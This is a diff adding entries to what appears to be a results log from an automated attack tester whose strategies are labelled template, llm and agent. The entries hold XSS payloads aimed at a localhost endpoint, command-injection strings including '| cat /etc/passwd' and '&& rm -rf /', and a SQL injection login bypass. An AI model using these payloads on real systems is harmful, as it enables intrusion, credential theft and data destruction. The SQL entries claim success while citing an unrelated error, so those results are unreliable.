@@ -538,5 +538,489 @@
       "stdout": "",
       "stderr": "Command not found: ; ls -la/* comment */"
     }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<img src=''x'' onerror=''alert(1)''>",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Cimg+src%3D%27%27x%27%27+onerror%3D%27%27alert%281%29%27%27%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775188496.0883405,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "template",
+      "attack_type": "xss",
+      "payload": "<img src=''x'' onerror=''alert(1)''>",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.044137239456177,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Cimg+src%3D%27%27x%27%27+onerror%3D%27%27alert%281%29%27%27%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<script>alert('XSS')</script>----",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E---- (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775188496.0903294,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "llm",
+      "attack_type": "xss",
+      "payload": "<script>alert('XSS')</script>----",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.063037633895874,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E---- (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<script>alert('XSS')</script>/* comment *//* comment */",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?email=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%2F%2A+comment+%2A%2F%2F%2A+comment+%2A%2F (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775188496.0920336,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "agent",
+      "attack_type": "xss",
+      "payload": "<script>alert('XSS')</script>/* comment *//* comment */",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.046973466873169,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?email=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%2F%2A+comment+%2A%2F%2F%2A+comment+%2A%2F (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "| cat /etc/passwd--/* comment */",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: | cat /etc/passwd--/* comment */",
+    "timestamp": 1775188496.0943727,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "template",
+      "payload": "| cat /etc/passwd--/* comment */",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: | cat /etc/passwd--/* comment */"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "; ls -la/* comment */",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: ; ls -la/* comment */",
+    "timestamp": 1775188496.096496,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "llm",
+      "payload": "; ls -la/* comment */",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: ; ls -la/* comment */"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "; ls -la#",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: ; ls -la#",
+    "timestamp": 1775188496.098092,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "agent",
+      "payload": "; ls -la#",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: ; ls -la#"
+    }
+  },
+  {
+    "attack_type": "sql_injection",
+    "payload": "' OR 1=1 --",
+    "target": "http://example.com/login",
+    "is_successful": true,
+    "response": "Welcome admin",
+    "timestamp": 1775188647.0741208,
+    "severity": "high",
+    "confidence": 0.9,
+    "details": {
+      "evidence": "SQL error detected"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'></iframe>--#",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?message=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E--%23 (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775195214.7020423,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "template",
+      "attack_type": "xss",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>--#",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.087606906890869,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?message=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E--%23 (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<img src='x' onerror='alert(1)'>--",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cimg+src%3D%27x%27+onerror%3D%27alert%281%29%27%3E-- (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775195214.7032638,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "llm",
+      "attack_type": "xss",
+      "payload": "<img src='x' onerror='alert(1)'>--",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.042263031005859,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cimg+src%3D%27x%27+onerror%3D%27alert%281%29%27%3E-- (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<script>alert(\"XSS\")</script>",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775195214.7043617,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "agent",
+      "attack_type": "xss",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.036240100860596,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: | cat /etc/passwd",
+    "timestamp": 1775195214.7053423,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "template",
+      "payload": "| cat /etc/passwd",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: | cat /etc/passwd"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "&& rm -rf //* comment */",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: && rm -rf //* comment */",
+    "timestamp": 1775195214.7063406,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "llm",
+      "payload": "&& rm -rf //* comment */",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: && rm -rf //* comment */"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "&& rm -rf /",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: && rm -rf /",
+    "timestamp": 1775195214.7073593,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "agent",
+      "payload": "&& rm -rf /",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: && rm -rf /"
+    }
+  },
+  {
+    "attack_type": "sql_injection",
+    "payload": "' OR 1=1 --",
+    "target": "http://example.com/login",
+    "is_successful": true,
+    "response": "Welcome admin",
+    "timestamp": 1775195377.4469953,
+    "severity": "high",
+    "confidence": 0.9,
+    "details": {
+      "evidence": "SQL error detected"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'></iframe>/* comment *//* comment */",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?comment=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%2F%2A+comment+%2A%2F%2F%2A+comment+%2A%2F (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775195957.4639592,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "template",
+      "attack_type": "xss",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>/* comment *//* comment */",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.052967309951782,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?comment=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%2F%2A+comment+%2A%2F%2F%2A+comment+%2A%2F (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<img src=\"x\" onerror=\"alert(1)\">/* comment */",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?message=%3Cimg+src%3D%22x%22+onerror%3D%22alert%281%29%22%3E%2F%2A+comment+%2A%2F (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775195957.466351,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "llm",
+      "attack_type": "xss",
+      "payload": "<img src=\"x\" onerror=\"alert(1)\">/* comment */",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.0759711265563965,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?message=%3Cimg+src%3D%22x%22+onerror%3D%22alert%281%29%22%3E%2F%2A+comment+%2A%2F (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<script>alert('XSS')</script>#",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%23 (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775195957.4686632,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "agent",
+      "attack_type": "xss",
+      "payload": "<script>alert('XSS')</script>#",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.08310604095459,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%23 (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "; ls -la#",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: ; ls -la#",
+    "timestamp": 1775195957.4710324,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "template",
+      "payload": "; ls -la#",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: ; ls -la#"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "; ls -la/* comment */",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: ; ls -la/* comment */",
+    "timestamp": 1775195957.4738631,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "llm",
+      "payload": "; ls -la/* comment */",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: ; ls -la/* comment */"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "| cat /etc/passwd--",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: | cat /etc/passwd--",
+    "timestamp": 1775195957.4763615,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "agent",
+      "payload": "| cat /etc/passwd--",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: | cat /etc/passwd--"
+    }
+  },
+  {
+    "attack_type": "sql_injection",
+    "payload": "' OR 1=1 --",
+    "target": "http://example.com/login",
+    "is_successful": true,
+    "response": "Welcome admin",
+    "timestamp": 1775196122.0656502,
+    "severity": "high",
+    "confidence": 0.9,
+    "details": {
+      "evidence": "SQL error detected"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<iframe src='javascript:alert(1)'></iframe>/* comment */",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%2F%2A+comment+%2A%2F (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775198058.2558413,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "template",
+      "attack_type": "xss",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>/* comment */",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.083112478256226,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%2F%2A+comment+%2A%2F (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<iframe src=\"javascript:alert(1)\"></iframe>",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?message=%3Ciframe+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775198058.259124,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "llm",
+      "attack_type": "xss",
+      "payload": "<iframe src=\"javascript:alert(1)\"></iframe>",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.066537857055664,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?message=%3Ciframe+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<iframe src=''javascript:alert(1)''></iframe>--",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Ciframe+src%3D%27%27javascript%3Aalert%281%29%27%27%3E%3C%2Fiframe%3E-- (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775198058.2625515,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "agent",
+      "attack_type": "xss",
+      "payload": "<iframe src=''javascript:alert(1)''></iframe>--",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.0795814990997314,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Ciframe+src%3D%27%27javascript%3Aalert%281%29%27%27%3E%3C%2Fiframe%3E-- (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "; ls -la",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: ; ls -la",
+    "timestamp": 1775198058.2652695,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "template",
+      "payload": "; ls -la",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: ; ls -la"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "&& rm -rf /",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: && rm -rf /",
+    "timestamp": 1775198058.2689931,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "llm",
+      "payload": "&& rm -rf /",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: && rm -rf /"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "; ls -la--/* comment */",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: ; ls -la--/* comment */",
+    "timestamp": 1775198058.2726219,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "agent",
+      "payload": "; ls -la--/* comment */",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: ; ls -la--/* comment */"
+    }
+  },
+  {
+    "attack_type": "sql_injection",
+    "payload": "' OR 1=1 --",
+    "target": "http://example.com/login",
+    "is_successful": true,
+    "response": "Welcome admin",
+    "timestamp": 1775198249.4650655,
+    "severity": "high",
+    "confidence": 0.9,
+    "details": {
+      "evidence": "SQL error detected"
+    }
   }
 ]
